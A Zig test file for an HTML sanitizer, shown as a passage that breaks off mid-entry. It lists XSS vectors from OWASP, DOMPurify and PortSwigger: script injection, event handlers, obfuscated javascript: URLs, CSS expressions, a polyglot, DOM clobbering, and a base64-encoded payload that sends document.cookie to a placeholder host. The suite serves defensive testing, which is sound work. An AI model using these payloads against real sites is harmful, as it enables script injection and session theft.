///! Sanitizer Test Vector Suite
///!
///! Contains XSS/injection test vectors from:
///! - OWASP XSS Filter Evasion Cheat Sheet
///! - OWASP Cross-Site Scripting Prevention Cheat Sheet
///! - OWASP DOM Clobbering Prevention Cheat Sheet
///! - DOMPurify test suite (loaded from JSON at runtime)
///!
///! Run with: zig build test -- --test-filter "sanitizer vector"
const std = @import("std");
const z = @import("../root.zig");
const testing = std.testing;

// ============================================================================
// Test Case Definition
// ============================================================================

/// A single sanitizer test vector.
///
/// Defines an attack payload and what should/should not survive sanitization.
/// Use `should_not_contain` for patterns that MUST be removed (the security assertion).
/// Use `should_contain` for patterns that MUST survive (preserve safe content).
pub const TestCase = struct {
    name: []const u8,
    threat_html: []const u8,
    should_not_contain: []const []const u8,
    should_contain: ?[]const []const u8 = null,
};

// ============================================================================
// Test Runner
// ============================================================================

/// Run a single test case: parse HTML, sanitize strictly, check assertions.
fn runTestCase(tc: TestCase) !void {
    const allocator = testing.allocator;

    const doc = z.parseHTML(allocator, tc.threat_html) catch |err| {
        std.debug.print("  SKIP [{s}]: parse error: {}\n", .{ tc.name, err });
        return;
    };
    defer z.destroyDocument(doc);

    const body = z.bodyNode(doc) orelse {
        std.debug.print("  SKIP [{s}]: no body node\n", .{tc.name});
        return;
    };

    z.sanitizeStrict(allocator, body) catch |err| {
        std.debug.print("  SKIP [{s}]: sanitize error: {}\n", .{ tc.name, err });
        return;
    };

    const body_elem = z.bodyElement(doc) orelse {
        std.debug.print("  SKIP [{s}]: no body element\n", .{tc.name});
        return;
    };
    const result = z.innerHTML(allocator, body_elem) catch |err| {
        std.debug.print("  SKIP [{s}]: innerHTML error: {}\n", .{ tc.name, err });
        return;
    };
    defer allocator.free(result);

    // Check should_not_contain (case-insensitive)
    for (tc.should_not_contain) |bad_pattern| {
        if (containsCaseInsensitive(result, bad_pattern)) {
            std.debug.print("\n  FAIL [{s}]\n", .{tc.name});
            std.debug.print("🔴    Forbidden pattern found: \"{s}\"\n", .{bad_pattern});
            std.debug.print("    Input:  {s}\n", .{tc.threat_html[0..@min(tc.threat_html.len, 200)]});
            std.debug.print("    Output: {s}\n", .{result[0..@min(result.len, 200)]});
            return error.TestUnexpectedResult;
        }
    }

    // Check should_contain (case-insensitive)
    if (tc.should_contain) |good_patterns| {
        for (good_patterns) |good_pattern| {
            if (!containsCaseInsensitive(result, good_pattern)) {
                std.debug.print("\n  FAIL [{s}]\n", .{tc.name});
                std.debug.print("🔴   Required pattern missing: \"{s}\"\n", .{good_pattern});
                std.debug.print("    Input:  {s}\n", .{tc.threat_html[0..@min(tc.threat_html.len, 200)]});
                std.debug.print("    Output: {s}\n", .{result[0..@min(result.len, 200)]});
                return error.TestUnexpectedResult;
            }
        }
    }
}

fn containsCaseInsensitive(haystack: []const u8, needle: []const u8) bool {
    if (haystack.len < needle.len) return false;
    for (0..(haystack.len - needle.len + 1)) |i| {
        var match = true;
        for (0..needle.len) |j| {
            if (std.ascii.toLower(haystack[i + j]) != std.ascii.toLower(needle[j])) {
                match = false;
                break;
            }
        }
        if (match) return true;
    }
    return false;
}

// ============================================================================
// OWASP XSS Filter Evasion Vectors
// https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
// ============================================================================

const OWASP_XSS_FILTER_EVASION = [_]TestCase{
    // --- Basic Script Injection ---
    .{
        .name = "OWASP: Basic script tag",
        .threat_html = "<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: Malformed IMG with script",
        .threat_html = "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
        .should_not_contain = &.{"script"},
    },

    // --- Event Handler Injection ---
    .{
        .name = "OWASP: onmouseover on anchor (quoted)",
        .threat_html = "<a onmouseover=\"alert(document.cookie)\">xxs link</a>",
        .should_not_contain = &.{"onmouseover"},
        .should_contain = &.{"xxs link"},
    },
    .{
        .name = "OWASP: onmouseover on anchor (unquoted)",
        .threat_html = "<a onmouseover=alert(document.cookie)>xxs link</a>",
        .should_not_contain = &.{"onmouseover"},
        .should_contain = &.{"xxs link"},
    },
    .{
        .name = "OWASP: IMG SRC=# onmouseover",
        .threat_html = "<IMG SRC=# onmouseover=\"alert('xxs')\">",
        .should_not_contain = &.{"onmouseover"},
    },
    .{
        .name = "OWASP: IMG SRC empty onmouseover",
        .threat_html = "<IMG SRC= onmouseover=\"alert('xxs')\">",
        .should_not_contain = &.{"onmouseover=\"alert('xss')"},
    },
    .{
        .name = "OWASP: IMG no SRC onmouseover",
        .threat_html = "<IMG onmouseover=\"alert('xxs')\">",
        .should_not_contain = &.{"onmouseover"},
    },
    .{
        .name = "OWASP: IMG SRC=/ onerror",
        .threat_html = "<IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"></img>",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "OWASP: BODY onload",
        .threat_html = "<BODY ONLOAD=alert('XSS')>",
        .should_not_contain = &.{"onload"},
    },
    .{
        .name = "OWASP: SVG onload",
        .threat_html = "<svg/onload=alert('XSS')>",
        .should_not_contain = &.{"onload"},
    },
    .{
        .name = "OWASP: Video source onerror",
        .threat_html = "<Video><source onerror=\"javascript:alert(XSS)\">",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "OWASP: IMG onerror window.onerror",
        .threat_html = "<Img src=x onerror=\"javascript: window.onerror=alert; throw XSS\">",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "OWASP: IMG onload eval base64",
        .threat_html = "<img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\">",
        .should_not_contain = &.{"onload"},
    },
    .{
        .name = "OWASP: Attribute-breaking IMG onerror",
        .threat_html = "\"><img src=\"x:x\" onerror=\"alert(XSS)\">",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "OWASP: IMG eval in onerror",
        .threat_html = "<img src=x:alert(alt) onerror=eval(src) alt=0>",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "OWASP: IMG unicode alert in onerror",
        .threat_html = "<img src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"></img>",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "OWASP: Input onmouseover",
        .threat_html = "<input/onmouseover=\"javaSCRIPT&colon;confirm&lpar;1&rpar;\"",
        .should_not_contain = &.{"onmouseover"},
    },

    // --- javascript: Protocol in URLs ---
    .{
        .name = "OWASP: fromCharCode in href",
        .threat_html = "<a href=\"javascript:alert(String.fromCharCode(88,83,83))\">Click</a>",
        .should_not_contain = &.{"javascript:"},
        .should_contain = &.{"Click"},
    },
    .{
        .name = "OWASP: Decimal HTML entity href",
        .threat_html = "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">Click</a>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: Tab in javascript: URL",
        .threat_html = "<a href=\"jav\tascript:alert('XSS');\">Click</a>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: INPUT IMAGE with javascript: src",
        .threat_html = "<INPUT TYPE=\"IMAGE\" SRC=\"javascript:alert('XSS');\">",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: BODY BACKGROUND javascript:",
        .threat_html = "<BODY BACKGROUND=\"javascript:alert('XSS')\">",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: IMG DYNSRC javascript:",
        .threat_html = "<IMG DYNSRC=\"javascript:alert('XSS')\">",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: IMG LOWSRC javascript:",
        .threat_html = "<IMG LOWSRC=\"javascript:alert('XSS')\">",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: IMG vbscript:",
        .threat_html = "<IMG SRC='vbscript:msgbox(\"XSS\")'>",
        .should_not_contain = &.{"vbscript:"},
    },
    .{
        .name = "OWASP: A HREF javascript: location",
        .threat_html = "<A HREF=\"javascript:document.location='http://www.google.com/'\">XSS</A>",
        .should_not_contain = &.{"javascript:"},
        .should_contain = &.{"XSS"},
    },
    .{
        .name = "OWASP: Button formaction javascript:",
        .threat_html = "<form><button formaction=javascript&colon;alert(1)>CLICKME",
        .should_not_contain = &.{"formaction"},
    },
    .{
        .name = "OWASP: Form anchor javascript: with unicode escape",
        .threat_html = "<form><a href=\"javascript:\\u0061lert(1)\">X",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: Anchor with many attrs and entity-encoded javascript:",
        .threat_html = "<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe",
        .should_not_contain = &.{"javascript:"},
    },

    // --- Script Tag Variations ---
    .{
        .name = "OWASP: Extraneous open brackets",
        .threat_html = "<<SCRIPT>alert(\"XSS\");//\\<</SCRIPT>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: No closing script tag",
        .threat_html = "<SCRIPT SRC=http://xss.rocks/xss.js?< B >",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: Protocol-relative script src",
        .threat_html = "<SCRIPT SRC=//xss.rocks/.j>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: Close and reopen script",
        .threat_html = "</script><script>alert('XSS');</script>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: End TITLE inject script",
        .threat_html = "</TITLE><SCRIPT>alert(\"XSS\")</SCRIPT>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: SCRIPT/XSS space-like char",
        .threat_html = "<SCRIPT/XSS SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: SCRIPT slash before SRC",
        .threat_html = "<SCRIPT/SRC=\"http://xss.rocks/xss.js\"></SCRIPT>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: Quote bypass type 1",
        .threat_html = "<SCRIPT a=\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: Quote bypass type 2",
        .threat_html = "<SCRIPT =\">\" SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: Script with invalid attribute",
        .threat_html = "<script x> alert(1) </script 1=2",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP: Script split injection",
        .threat_html = "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
        .should_not_contain = &.{"script"},
    },

    // --- Dangerous Elements ---
    .{
        .name = "OWASP: IFRAME javascript: src",
        .threat_html = "<IFRAME SRC=\"javascript:alert('XSS');\"></IFRAME>",
        .should_not_contain = &.{ "iframe", "javascript:" },
    },
    .{
        .name = "OWASP: IFRAME onmouseover",
        .threat_html = "<IFRAME SRC=# onmouseover=\"alert(document.cookie)\"></IFRAME>",
        .should_not_contain = &.{ "iframe", "onmouseover" },
    },
    .{
        .name = "OWASP: IFRAME data: URL with SVG",
        .threat_html = "<iframe/src=\"data:text/html,<svg onload=alert(1)>\">",
        .should_not_contain = &.{"iframe"},
    },
    .{
        .name = "OWASP: Attribute-breaking IFRAME",
        .threat_html = "\"><iframe src=\"javascript:alert(XSS)\">",
        .should_not_contain = &.{"iframe"},
    },
    .{
        .name = "OWASP: OBJECT with scriptlet",
        .threat_html = "<OBJECT TYPE=\"text/x-scriptlet\" DATA=\"http://xss.rocks/scriptlet.html\"></OBJECT>",
        .should_not_contain = &.{"object"},
    },
    .{
        .name = "OWASP: OBJECT data javascript:",
        .threat_html = "<object data=\"javascript:alert(XSS)\">",
        .should_not_contain = &.{"object"},
    },
    .{
        .name = "OWASP: EMBED with Base64 SVG",
        .threat_html = "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>",
        .should_not_contain = &.{"embed"},
    },
    .{
        .name = "OWASP: BGSOUND javascript:",
        .threat_html = "<BGSOUND SRC=\"javascript:alert('XSS');\">",
        .should_not_contain = &.{"bgsound"},
    },
    .{
        .name = "OWASP: Applet code javascript:",
        .threat_html = "<applet code=\"javascript:confirm(document.cookie);\">",
        .should_not_contain = &.{"applet"},
    },
    .{
        .name = "OWASP: FRAMESET with FRAME javascript:",
        .threat_html = "<body><FRAMESET><FRAME SRC=\"javascript:alert('XSS');\"></FRAMESET></body>",
        .should_not_contain = &.{"frame"},
    },

    // --- META Tag Attacks ---
    .{
        .name = "OWASP: META refresh javascript:",
        .threat_html = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('XSS');\">",
        .should_not_contain = &.{"meta"},
    },
    .{
        .name = "OWASP: META refresh data: base64",
        .threat_html = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">",
        .should_not_contain = &.{"meta"},
    },
    .{
        .name = "OWASP: META with entities and javascript:",
        .threat_html = "<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>",
        .should_not_contain = &.{"meta"},
    },

    // --- LINK / Stylesheet Attacks ---
    .{
        .name = "OWASP: LINK stylesheet javascript:",
        .threat_html = "<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">",
        .should_not_contain = &.{"link"},
    },
    .{
        .name = "OWASP: LINK to remote stylesheet",
        .threat_html = "<LINK REL=\"stylesheet\" HREF=\"http://xss.rocks/xss.css\">",
        .should_not_contain = &.{"link"},
    },

    // --- BASE Tag ---
    .{
        .name = "OWASP: BASE HREF javascript:",
        .threat_html = "<BASE HREF=\"javascript:alert('XSS');//\">",
        .should_not_contain = &.{"base"},
    },

    // --- Style-Based Attacks ---
    .{
        .name = "OWASP: STYLE list-style-image javascript:",
        .threat_html = "<STYLE>li {list-style-image: url(\"javascript:alert('XSS')\");}</STYLE><UL><LI>XSS</LI></UL>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: STYLE background-image javascript:",
        .threat_html = "<STYLE>.XSS{background-image:url(\"javascript:alert('XSS')\");}</STYLE><A CLASS=XSS></A>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: STYLE body background javascript:",
        .threat_html = "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert('XSS')\")}</STYLE>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: IMG STYLE expression",
        .threat_html = "<IMG STYLE=\"xss:expr/*XSS*/ession(alert('XSS'))\">",
        .should_not_contain = &.{"expression"},
    },
    .{
        .name = "OWASP: DIV STYLE width expression",
        .threat_html = "<DIV STYLE=\"width: expression(alert('XSS'));\">",
        .should_not_contain = &.{"expression"},
    },
    .{
        .name = "OWASP: DIV background-image javascript:",
        .threat_html = "<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: Anonymous tag with expression",
        .threat_html = "<XSS STYLE=\"xss:expression(alert('XSS'))\">",
        .should_not_contain = &.{"expression"},
    },
    .{
        .name = "OWASP: STYLE @import remote",
        .threat_html = "<STYLE>@import'http://xss.rocks/xss.css';</STYLE>",
        .should_not_contain = &.{"@import"},
    },
    .{
        .name = "OWASP: STYLE -moz-binding",
        .threat_html = "<STYLE>BODY{-moz-binding:url(\"http://xss.rocks/xssmoz.xml#xss\")}</STYLE>",
        .should_not_contain = &.{"-moz-binding"},
    },
    .{
        .name = "OWASP: STYLE behavior url",
        .threat_html = "<XSS STYLE=\"behavior: url(xss.htc);\">",
        .should_not_contain = &.{"behavior"},
    },

    // --- TABLE Attacks ---
    .{
        .name = "OWASP: TABLE BACKGROUND javascript:",
        .threat_html = "<TABLE BACKGROUND=\"javascript:alert('XSS')\">",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP: TD BACKGROUND javascript:",
        .threat_html = "<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">",
        .should_not_contain = &.{"javascript:"},
    },

    // --- SVG / XML ---
    .{
        .name = "OWASP: SVG script xlink:href data:",
        .threat_html = "<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script",
        .should_not_contain = &.{"script"},
    },

    // --- DOM Clobbering ---
    .{
        .name = "OWASP: Anchor redirect clobbering javascript:",
        .threat_html = "<a id=redirectTo href='javascript:alert(1)'>",
        .should_not_contain = &.{"javascript:"},
    },
};

// ============================================================================
// OWASP XSS Prevention Cheat Sheet Vectors
// https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
// ============================================================================

const OWASP_XSS_PREVENTION = [_]TestCase{
    .{
        .name = "XSS Prevention: Script injection in body",
        .threat_html = "<script>alert(1)</script>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "XSS Prevention: Event handler div onblur",
        .threat_html = "<div attr=\"x\" onblur=\"alert(1)\">",
        .should_not_contain = &.{"onblur"},
    },
    .{
        .name = "XSS Prevention: CSS background-url javascript:",
        .threat_html = "<div style=\"background-url: javascript:alert(xss);\">",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "XSS Prevention: Unsafe URL in href",
        .threat_html = "<a href=\"javascript:alert('XSS')\">clickme</a>",
        .should_not_contain = &.{"javascript:"},
        .should_contain = &.{"clickme"},
    },
    .{
        .name = "XSS Prevention: Unsafe iframe src",
        .threat_html = "<iframe src=\"javascript:alert('XSS')\"/>",
        .should_not_contain = &.{"iframe"},
    },
    .{
        .name = "XSS Prevention: CSS style body background javascript:",
        .threat_html = "<style>body{background:url(\"javascript:alert('XSS')\")}</style>",
        .should_not_contain = &.{"javascript:"},
    },
};

// ============================================================================
// OWASP DOM Clobbering Prevention Vectors
// https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html
// ============================================================================

const OWASP_DOM_CLOBBERING = [_]TestCase{
    .{
        .name = "DOM Clobbering: IMG name=createElement",
        .threat_html = "<img src=x name=createElement><img src=y id=createElement>",
        .should_not_contain = &.{ "name=\"createElement\"", "id=\"createElement\"" },
    },
    .{
        .name = "DOM Clobbering: IMG name=cookie",
        .threat_html = "<img src=x name=cookie>",
        .should_not_contain = &.{"name=\"cookie\""},
    },
    .{
        .name = "DOM Clobbering: A id=location",
        .threat_html = "<a href=\"#some-code-here\" id=\"location\">invisible",
        .should_not_contain = &.{"id=\"location\""},
        .should_contain = &.{"invisible"},
    },
    .{
        .name = "DOM Clobbering: Form with clobbering input names",
        .threat_html = "<div onclick=alert(0)><form onsubmit=alert(1)><input onfocus=alert(2) name=parentNode>123</form></div>",
        .should_not_contain = &.{ "onclick", "onsubmit", "onfocus" },
        .should_contain = &.{"123"},
    },
    .{
        .name = "DOM Clobbering: Input name=attributes",
        .threat_html = "<form onmouseover='alert(1)'><input name=\"attributes\"><input name=\"attributes\">",
        .should_not_contain = &.{"onmouseover"},
    },
};

// ============================================================================
// DOMPurify-Derived Vectors (from known bypass patterns)
// ============================================================================

const DOMPURIFY_DERIVED = [_]TestCase{
    .{
        .name = "DOMPurify: b href javascript: stripped, title preserved",
        .threat_html = "<b href=\"javascript:alert(1)\" title=\"javascript:alert(2)\"></b>",
        .should_not_contain = &.{"href"},
    },
    .{
        .name = "DOMPurify: IMG src javascript: stripped",
        .threat_html = "<img src='javascript:while(1){}'>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "DOMPurify: A href data: stripped",
        .threat_html = "<a href=data:,evilnastystuff>clickme</a>",
        .should_not_contain = &.{"data:"},
        .should_contain = &.{"clickme"},
    },
    .{
        .name = "DOMPurify: Unicode whitespace before javascript: in href",
        .threat_html = "123<a href=' javascript:alert(1)'>CLICK</a>",
        .should_not_contain = &.{"javascript:"},
        .should_contain = &.{"CLICK"},
    },
    .{
        .name = "DOMPurify: Textarea prevents img onerror escape",
        .threat_html = "<textarea>@shafigullin</textarea><!--</textarea><img src=x onerror=alert(1)>-->",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "DOMPurify: Noscript img escape",
        .threat_html = "<b><noscript><!-- </noscript><img src=x onerror=alert(1) --></noscript>",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "DOMPurify: Template with nested img onerror",
        .threat_html = "<body><template><s><template><s><img src=x onerror=alert(1)>@shafigullin</s></template></s></template>",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "DOMPurify: Style tag stripped (strict mode)",
        .threat_html = "<style>*{color: red}</style>",
        .should_not_contain = &.{"style"},
    },
    .{
        .name = "DOMPurify: Listing with encoded img onerror",
        .threat_html = "<listing>&lt;img onerror=\"alert(1);//\" src=x&gt;<t t></listing>",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "DOMPurify: IMG id/= attribute breakout",
        .threat_html = "<img src=x id/=' onerror=alert(1)//'>",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "DOMPurify: Input checkbox onclick stripped",
        .threat_html = "<input type=checkbox checked><input type=checkbox onclick>",
        .should_not_contain = &.{"onclick"},
    },
    .{
        .name = "DOMPurify: Select template img onerror",
        .threat_html = "<select><template><img src=x onerror=alert(1)></template></select>",
        .should_not_contain = &.{"onerror"},
    },
    .{
        .name = "DOMPurify: p tag preserved",
        .threat_html = "<p>hello</p>",
        .should_not_contain = &.{},
        .should_contain = &.{ "<p>", "hello" },
    },
    .{
        .name = "DOMPurify: Plain text preserved",
        .threat_html = "123456",
        .should_not_contain = &.{},
        .should_contain = &.{"123456"},
    },
};

// ============================================================================
// OWASP XSS Filter Evasion — Encoding & Obfuscation Bypasses
// Additional vectors from the cheat sheet not covered in the basic suite
// https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
// ============================================================================

const OWASP_ENCODING_BYPASSES = [_]TestCase{
    // --- Character Reference Padding ---
    .{
        .name = "OWASP-Enc: Padded decimal entities (7 digits, no semicolons)",
        .threat_html = "<a href=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041\">Click</a>",
        .should_not_contain = &.{"javascript:"},
        .should_contain = &.{"Click"},
    },
    .{
        .name = "OWASP-Enc: Hex entities without semicolons",
        .threat_html = "<a href=\"&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29\">Click</a>",
        .should_not_contain = &.{"javascript:"},
        .should_contain = &.{"Click"},
    },

    // --- Whitespace/Control Character Injection in javascript: URLs ---
    .{
        .name = "OWASP-Enc: Encoded tab &#x09; splitting javascript:",
        .threat_html = "<a href=\"jav&#x09;ascript:alert('XSS');\">Click</a>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP-Enc: Encoded newline &#x0A; splitting javascript:",
        .threat_html = "<a href=\"jav&#x0A;ascript:alert('XSS');\">Click</a>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP-Enc: Encoded CR &#x0D; splitting javascript:",
        .threat_html = "<a href=\"jav&#x0D;ascript:alert('XSS');\">Click</a>",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP-Enc: Control char &#14; before javascript: in href",
        .threat_html = "<a href=\" &#14; javascript:alert('XSS');\">Click</a>",
        .should_not_contain = &.{"javascript:"},
    },

    // --- CSS Encoding Tricks ---
    .{
        .name = "OWASP-Enc: Unicode-encoded CSS background-image javascript: URL",
        .threat_html = "<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">",
        .should_not_contain = &.{"javascript:"},
    },
    .{
        .name = "OWASP-Enc: Escaped @import with backslashes",
        .threat_html = "<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>",
        .should_not_contain = &.{"@import"},
    },
    .{
        .name = "OWASP-Enc: STYLE expression with regex syntax",
        .threat_html = "<style>//*{x:expression(alert(/xss/))}//<style></style>",
        .should_not_contain = &.{"expression"},
    },
    .{
        .name = "OWASP-Enc: Malformed javascript protocol in STYLE background",
        .threat_html = "<STYLE type=\"text/css\">BODY{background:url(\"<javascript:alert>('XSS')\")}</STYLE>",
        .should_not_contain = &.{"javascript:"},
    },

    // --- META Bypasses ---
    .{
        .name = "OWASP-Enc: META double URL parameter bypass",
        .threat_html = "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('XSS');\">",
        .should_not_contain = &.{"meta"},
    },
    .{
        .name = "OWASP-Enc: META Set-Cookie with script injection",
        .threat_html = "<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=<SCRIPT>alert('XSS')</SCRIPT>\">",
        .should_not_contain = &.{"meta"},
    },

    // --- OBJECT Variations ---
    .{
        .name = "OWASP-Enc: OBJECT CLASSID with DataURL param",
        .threat_html = "<OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"><PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"></OBJECT>",
        .should_not_contain = &.{"object"},
    },

    // --- Polyglot ---
    .{
        .name = "OWASP-Enc: XSS polyglot payload",
        .threat_html = "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(42);//'>",
        .should_not_contain = &.{ "onload", "onmouseover" },
    },

    // --- Conditional Comments (IE) ---
    .{
        .name = "OWASP-Enc: IE conditional comment with script",
        .threat_html = "<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->",
        .should_not_contain = &.{"script"},
    },

    // --- data: URI Variations ---
    .{
        .name = "OWASP-Enc: iframe with percent-encoded data: URI script",
        .threat_html = "<iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"></iframe>",
        .should_not_contain = &.{"iframe"},
    },
    .{
        .name = "OWASP-Enc: iframe src with encoded colon and entities",
        .threat_html = "<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>",
        .should_not_contain = &.{"iframe"},
    },

    // --- Quote Encapsulation Bypasses ---
    .{
        .name = "OWASP-Enc: Script with multiple quote pairs",
        .threat_html = "<SCRIPT a=\">\" '' SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
        .should_not_contain = &.{"script"},
    },
    .{
        .name = "OWASP-Enc: Script grave accent quotes",
        .threat_html = "<SCRIPT a=`>` SRC=\"httx://xss.rocks/xss.js\"></SCRIPT>",
        .should_not_contain = &.{"script"},
    },

    // --- Null byte / Comment-split ---
    .{
        .name = "OWASP-Enc: IMG with null byte comment split and onerror",
        .threat_html = "</script><img/*%00/src=\"worksinchrome&colon;prompt(1)\"/%00*/onerror='eval(src)'>",
        .should_not_contain = &.{"onerror"},
    },

    // --- isindex/obsolete element attacks ---
    .{
        .name = "OWASP-Enc: isindex with event handler",
        .threat_html = "<isindex x=\"javascript:\" onmouseover=\"alert(XSS)\">",
        .should_not_contain = &.{"onmouseover"},
    },
    .{
        .name = "OWASP-Enc: isindex type=image onerror",
        .threat_html = "<isindex type=image src=1 onerror=alert(XSS)>",
        .should_not_contain = &.{"onerror"},
    },

    // --- Context breakout attacks ---
    .{
        .name = "OWASP-Enc: Multiple context breakout with script",
        .threat_html = "\"></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
        .should_not_contain = &.{"script"},
    },
};

// ============================================================================
// PortSwigger XSS Cheat Sheet — Comprehensive Event Handler Coverage
// https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
// Tests that ALL on* attributes are stripped regardless of event type.
// ============================================================================

const PORTSWIGGER_EVENT_HANDLERS = [_]TestCase{
    // --- CSS Animation Events (no user interaction needed) ---
    .{
        .name = "PS: onanimationend on custom tag",
        .threat_html = "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationend=\"alert(1)\"></xss>",
        .should_not_contain = &.{"onanimationend"},
    },
    .{
        .name = "PS: onanimationstart on custom tag",
        .threat_html = "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onanimationstart=\"alert(1)\"></xss>",
        .should_not_contain = &.{"onanimationstart"},
    },
    .{
        .name = "PS: onanimationiteration",
        .threat_html = "<style>@keyframes slidein{}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></xss>",
        .should_not_contain = &.{"onanimationiteration"},
    },
    .{
        .name = "PS: onanimationcancel",
